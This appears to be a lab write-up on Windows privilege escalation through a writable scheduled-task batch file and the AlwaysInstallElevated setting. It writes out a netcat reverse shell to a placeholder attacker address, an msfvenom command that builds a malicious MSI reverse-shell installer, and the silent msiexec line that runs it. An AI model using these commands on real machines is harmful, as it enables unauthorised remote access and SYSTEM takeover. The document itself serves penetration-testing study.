
🔧 Privilege Escalation via Scheduled Tasks & AlwaysInstallElevated
🗂️ Summary

This note covers two Windows privilege escalation techniques:

    Abusing Scheduled Tasks where you can modify a vulnerable binary

    The AlwaysInstallElevated misconfiguration (informational)

📅 1. Scheduled Tasks Exploitation

Scheduled tasks can be abused when the executable they trigger is writable by a lower-privileged user.
🔍 How to Enumerate Scheduled Tasks

Use schtasks to list and inspect tasks:

schtasks

Check for detailed task info:

schtasks /query /tn vulntask /fo list /v

Look for:

    Task To Run: the file or script being executed

    Run As User: the user account the task runs under

Example Output:

TaskName:         \vulntask
Task To Run:      C:\tasks\schtask.bat
Run As User:      taskusr1

🔐 Check Permissions on Task File

icacls C:\tasks\schtask.bat

If you see something like:

BUILTIN\Users:(I)(F)

It means unprivileged users can modify the file — a potential privilege escalation vector.
🐚 Inject a Reverse Shell

Replace the task’s batch file contents with a Netcat reverse shell:

echo C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

    💡 nc64.exe (Netcat for Windows) is often pre-loaded in C:\tools.

🖥 Start Listener on Attacker Machine

nc -lvp 4444

▶️ Manually Run the Task

Normally, you'd wait for the task to trigger. But in this case, you can start it manually:

schtasks /run /tn vulntask

✅ Shell Output

You should now receive a reverse shell with taskusr1 privileges:

user@attacker$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received...
C:\Windows\System32> whoami
wprivesc1\taskusr1

    🔐 You’ve successfully escalated privileges!

💡 2. AlwaysInstallElevated (Info Only)

This method does not work on this target machine, but is valuable to know.
🧠 Concept

If the following registry keys are set to 1, any user can run .msi installers as NT AUTHORITY\SYSTEM:

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

⚙️ Exploiting with msfvenom

Generate a malicious MSI installer:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_IP LPORT=PORT -f msi -o malicious.msi

📥 Execute on Target

msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

    This will spawn a SYSTEM shell if AlwaysInstallElevated is enabled.

📌 Notes

    Make sure both registry keys are set to 1.

    MSI runs must be silent (/quiet /qn) to avoid UI prompts.

🏁 Summary
Technique	Goal	Requires Writable File?	Exploit Type
Scheduled Task Abuse	Escalate to taskusr1	✅ schtask.bat	Local PrivEsc
AlwaysInstallElevated	SYSTEM via MSI installer	❌ (Needs Registry Keys)	Misconfig Exploit